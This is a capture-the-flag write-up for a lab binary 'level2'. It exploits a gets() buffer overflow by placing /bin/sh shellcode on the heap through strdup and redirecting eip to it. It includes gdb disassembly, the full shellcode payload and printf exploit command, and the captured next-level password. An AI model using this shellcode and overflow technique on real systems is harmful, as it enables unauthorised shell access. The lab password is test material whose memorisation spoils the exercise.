What do we have?

	$ ll
	total 17
	dr-xr-x---+ 1 level2 level2   80 Mar  6  2016 ./
	dr-x--x--x  1 root   root    340 Sep 23  2015 ../
	-rw-r--r--  1 level2 level2  220 Apr  3  2012 .bash_logout
	-rw-r--r--  1 level2 level2 3530 Sep 23  2015 .bashrc
	-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2*
	-rw-r--r--+ 1 level2 level2   65 Sep 23  2015 .pass
	-rw-r--r--  1 level2 level2  675 Apr  3  2012 .profile

A `level2` binary. Let's check the assembly:

	$ gdb ./level2
	[...]
	(gdb) b main
	[...]
	(gdb) r
	[...]
	(gdb) disas
	Dump of assembler code for function main:
	0x0804853f <+0>:	push   %ebp
	0x08048540 <+1>:	mov    %esp,%ebp
	=> 0x08048542 <+3>:	and    $0xfffffff0,%esp
	0x08048545 <+6>:	call   0x80484d4 <p>
	0x0804854a <+11>:	leave  
	0x0804854b <+12>:	ret    
	End of assembler dump.

It simply calls a function `p` (+6). If we check its assembly:

	(gdb) disas p
	Dump of assembler code for function p:
	0x080484d4 <+0>:	push   %ebp
	0x080484d5 <+1>:	mov    %esp,%ebp
	0x080484d7 <+3>:	sub    $0x68,%esp
	0x080484da <+6>:	mov    0x8049860,%eax
	0x080484df <+11>:	mov    %eax,(%esp)
	0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
	0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
	0x080484ea <+22>:	mov    %eax,(%esp)
	0x080484ed <+25>:	call   0x80483c0 <gets@plt>
	0x080484f2 <+30>:	mov    0x4(%ebp),%eax
	0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
	0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
	0x080484fb <+39>:	and    $0xb0000000,%eax
	0x08048500 <+44>:	cmp    $0xb0000000,%eax
	0x08048505 <+49>:	jne    0x8048527 <p+83>
	0x08048507 <+51>:	mov    $0x8048620,%eax
	0x0804850c <+56>:	mov    -0xc(%ebp),%edx
	0x0804850f <+59>:	mov    %edx,0x4(%esp)
	0x08048513 <+63>:	mov    %eax,(%esp)
	0x08048516 <+66>:	call   0x80483a0 <printf@plt>
	0x0804851b <+71>:	movl   $0x1,(%esp)
	0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
	0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
	0x0804852a <+86>:	mov    %eax,(%esp)
	0x0804852d <+89>:	call   0x80483f0 <puts@plt>
	0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
	0x08048535 <+97>:	mov    %eax,(%esp)
	0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
	0x0804853d <+105>:	leave  
	0x0804853e <+106>:	ret    
	End of assembler dump.

So, it does a buffer of 104 (+3), `fflush` the `stdout` (+6 to +14), calls a `gets` (+25), and then do a comparison on the return address (+33 to +44) it stored beforehand (+19). As there is no call to `execve` or the likes, we'll have to inject some shellcode to create one. First, we calculate the offset of `eip` with the same method as the previous level, and get 80. Next, we search a shellcode in a database made for that (https://shell-storm.org/shellcode/index.html). We need one that is less than 80 bytes, and, as we use `gets`, one that close and re-open the `stdin`. This one (http://shell-storm.org/shellcode/files/shellcode-219.html) is 55 bytes. Perfect!

	\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80

Then, we struggled for hours trying to inject it into the stack, but then we realized that all 0xb[...] addresses, checked by the program, are in fact from the stack for a Linux x86, rendering all our effort meaningless.

So, looking at the reconstructed C, all that is left to use for us is the `strdup`. At that point, we got an idea: `strdup` does a `malloc`, which returns a pointer to the heap. The address generated depends on what's available, but we are in a controlled environment! Meaning, it's quite possible the address allocated is the same at each call. It's also highly suspicious that the malloc is done, basically, at the very end, and does not even store the pointer. Giving that address to `eip` would execute the shellcode we hide there.

First, let's grab the address returned by malloc. We'll put breakpoints, and stop at `strdup`.

	$ gdb ./level2
	[...]
	(gdb) b main
	[...]
	(gdb) r
	[...]
	(gdb) b gets
	[...]
	(gdb) b strdup
	[...]
	(gdb) continue
	[...]
	(gdb) n
	Single stepping until exit from function gets,
	which has no line number information.
	aaaaaa
	[...]
	(gdb) continue
	[...]
	Breakpoint 3, 0xb7ea8d30 in strdup () from /lib/i386-linux-gnu/libc.so.6

Next, we'll disas it.

	(gdb) disas strdup
	Dump of assembler code for function strdup:
	0xb7ea8d30 <+0>:	sub    $0x1c,%esp
	0xb7ea8d33 <+3>:	mov    %ebx,0x10(%esp)
	0xb7ea8d37 <+7>:	call   0xb7f56c73
	0xb7ea8d3c <+12>:	add    $0x1282b8,%ebx
	0xb7ea8d42 <+18>:	mov    %esi,0x14(%esp)
	0xb7ea8d46 <+22>:	mov    0x20(%esp),%esi
	0xb7ea8d4a <+26>:	mov    %edi,0x18(%esp)
	0xb7ea8d4e <+30>:	mov    %esi,(%esp)
	0xb7ea8d51 <+33>:	call   0xb7ea9120
	0xb7ea8d56 <+38>:	lea    0x1(%eax),%edi
	0xb7ea8d59 <+41>:	mov    %edi,(%esp)
	0xb7ea8d5c <+44>:	call   0xb7e42e80 <malloc@plt>
	0xb7ea8d61 <+49>:	mov    %eax,%edx
	0xb7ea8d63 <+51>:	xor    %eax,%eax
	0xb7ea8d65 <+53>:	test   %edx,%edx
	0xb7ea8d67 <+55>:	je     0xb7ea8d79 <strdup+73>
	0xb7ea8d69 <+57>:	mov    %edi,0x8(%esp)
	0xb7ea8d6d <+61>:	mov    %esi,0x4(%esp)
	0xb7ea8d71 <+65>:	mov    %edx,(%esp)
	0xb7ea8d74 <+68>:	call   0xb7eaa920
	0xb7ea8d79 <+73>:	mov    0x10(%esp),%ebx
	0xb7ea8d7d <+77>:	mov    0x14(%esp),%esi
	0xb7ea8d81 <+81>:	mov    0x18(%esp),%edi
	0xb7ea8d85 <+85>:	add    $0x1c,%esp
	0xb7ea8d88 <+88>:	ret    
	End of assembler dump.

The result of `malloc` (+44) should be in `eax` (+49). Let's break at that `mov` and check the value.

	(gdb) b *0xb7ea8d61
	Breakpoint 4 at 0xb7ea8d61
	(gdb) continue
	[...]
	(gdb) i r
	eax            0x804a008	134520840
	[...]

`0x804a008` is the answer! We also discovered `ltrace` a little bit after, that could have given us the answer quicker.

	$ ltrace ./level2
	__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
	fflush(0xb7fd1a20)                                                                    = 0
	gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5
	)                                         = 0xbffff6fc
	puts(""
	)                                                                              = 1
	strdup("")                                                                            = 0x0804a008
	+++ exited (status 8) +++

That's what we need to overwrite `eip` with. The shellcode being 55 bytes, we still need 25 (80-55) fillers, to which we'll append the address we got (in \x?? format, and reversed).

	\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7A\x08\xa0\x04\x08

We don't need to add a `cat` there, as the shellcode will handle the stdin. And...

	$ (printf '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7A'; printf '\x08\xa0\x04\x08') | ./level2
	1�1۰̀Sh/ttyh/dev��1�f�'�̀1�Ph//shh/bin��PS�ᙰ
											Aa0Aa1Aaa4Aa5Aa6Aa7�
	$ cat /home/user/level3/.pass
	492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
